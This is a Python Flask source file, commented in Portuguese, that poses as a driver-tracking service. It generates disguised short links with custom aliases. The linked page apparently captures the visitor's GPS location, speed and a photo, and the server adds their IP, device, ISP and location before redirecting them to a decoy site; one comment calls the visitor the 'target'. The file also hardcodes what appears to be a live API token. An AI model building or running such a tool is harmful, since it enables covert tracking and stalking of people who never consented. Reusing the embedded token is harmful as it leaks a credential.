from flask import Flask, render_template, request, jsonify, redirect, url_for
import uuid
from datetime import datetime
import os
import requests

app = Flask(__name__)
FROTA = {}

# --- CONFIGURAÇÃO ---
# Seu Token do TinyURL inserido aqui
TOKEN_TINYURL = "z1TYfa105Sj4DxK1t7LYkGBzuHO06KDd5z0jj0mUYiEeNBzh4ZT7ItMXvtbz"

def encurtar_url(url_longa, alias=None):
    """Encurta a URL usando a API V1 do TinyURL para suportar Aliases."""
    if "127.0.0.1" in url_longa or "localhost" in url_longa: 
        return url_longa
    
    # Se não houver alias, usa a API pública simples
    if not alias:
        try:
            r = requests.get(f"https://tinyurl.com/api-create.php?url={url_longa}", timeout=10)
            return r.text.strip() if r.status_code == 200 else url_longa
        except:
            return url_longa

    # Se houver alias, usa a API JSON com o seu Token
    headers = {
        "Authorization": f"Bearer {TOKEN_TINYURL}",
        "Content-Type": "application/json"
    }
    payload = {
        "url": url_longa,
        "domain": "tinyurl.com",
        "alias": alias.strip().replace(" ", "-") # Remove espaços para evitar erro
    }
    
    try:
        r = requests.post("https://api.tinyurl.com/create", json=payload, headers=headers, timeout=10)
        res_json = r.json()
        
        if r.status_code in [200, 201]:
            return res_json["data"]["tiny_url"]
        else:
            # Se o alias já estiver ocupado, ele gera um link comum para não travar o app
            print(f"Aviso: Alias '{alias}' já em uso ou inválido. Gerando link padrão.")
            return encurtar_url(url_longa) 
    except Exception as e:
        print(f"Erro na conexão com TinyURL: {e}")
        return url_longa

# --- MANTENDO SUAS OUTRAS FUNÇÕES ---
def extrair_dados_tecnicos(ua_string):
    ua = ua_string.lower()
    dispositivo = "📱 Android" if "android" in ua else "📱 iPhone/iOS" if "iphone" in ua or "ipad" in ua else "💻 PC Windows" if "windows" in ua else "❓ Desconhecido"
    
    if "chrome" in ua and "safari" in ua and "edg" not in ua: browser = "🌐 Chrome"
    elif "safari" in ua and "chrome" not in ua: browser = "🌐 Safari"
    elif "firefox" in ua: browser = "🌐 Firefox"
    elif "edg" in ua: browser = "🌐 Edge"
    elif "whatsapp" in ua: browser = "💬 WhatsApp Webview"
    else: browser = "🌐 Navegador"
    
    return dispositivo, browser

def consultar_ip(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp", timeout=3).json()
        if res.get("status") == "success":
            return f"{res.get('city')}, {res.get('regionName')} - {res.get('country')}", res.get("isp")
    except: pass
    return "Não identificado", "Não identificado"

# --- ROTAS ---
@app.route('/')
def index():
    return redirect(url_for('admin_panel'))

@app.route('/admin')
def admin_panel():
    return render_template("admin.html", frota=FROTA)

@app.route('/gerar_ordem', methods=['POST'])
def gerar_ordem():
    motorista = request.form.get("motorista")
    personalizacao = request.form.get("personalizacao") # Recebe o Alias do formulário
    redirect_url = request.form.get("redirect") or "https://www.google.com"

    id_ordem = str(uuid.uuid4())[:8]
    link_longo = url_for('tela_motorista', id_ordem=id_ordem, _external=True)
    
    # Agora o encurtador usa o seu Token e o Alias escolhido
    link_curto = encurtar_url(link_longo, alias=personalizacao)
    
    FROTA[id_ordem] = {
        "motorista": motorista,
        "lat": None, "lon": None,
        "foto": None,
        "status": "Aguardando Conexão",
        "ultimo_visto": "-",
        "link": link_curto,
        "redirect": redirect_url,
        "ip": "-", "device": "-", "browser": "-", "local_ip": "-", "provedor": "-",
        "precisao": "-", "velocidade": 0
    }
    return redirect(url_for('admin_panel'))

@app.route('/api/frota')
def api_frota():
    return jsonify(FROTA)

@app.route('/verificar-entrega/<id_ordem>')
def tela_motorista(id_ordem):
    if id_ordem not in FROTA: return "Link expirado.", 404
    destino = FROTA[id_ordem].get("redirect", "https://www.google.com")
    return render_template("motorista.html", id=id_ordem, destino=destino)

@app.route('/api/sinal/<id_ordem>', methods=['POST'])
def receber_sinal(id_ordem):
    if id_ordem in FROTA:
        data = request.get_json()
        ua_string = request.headers.get('User-Agent')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        dispositivo, browser = extrair_dados_tecnicos(ua_string)
        localizacao_ip, provedor = consultar_ip(ip)
        
        FROTA[id_ordem].update({
            'lat': data.get('latitude'),
            'lon': data.get('longitude'),
            'foto': data.get('foto'), # <--- NOVO: RECEBE A FOTO ENVIADA PELO ALVO
            'status': "🟢 Online / Rastreando",
            'ultimo_visto': datetime.now().strftime("%d/%m %H:%M:%S"),
            'ip': ip,
            'device': dispositivo,
            'browser': browser,
            'local_ip': localizacao_ip,
            'provedor': provedor,
            'precisao': f"{data.get('accuracy', 0)}m",
            'velocidade': data.get('speed', 0)
        })
        return jsonify({"ok": True}), 200
    return jsonify({"ok": False}), 404

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
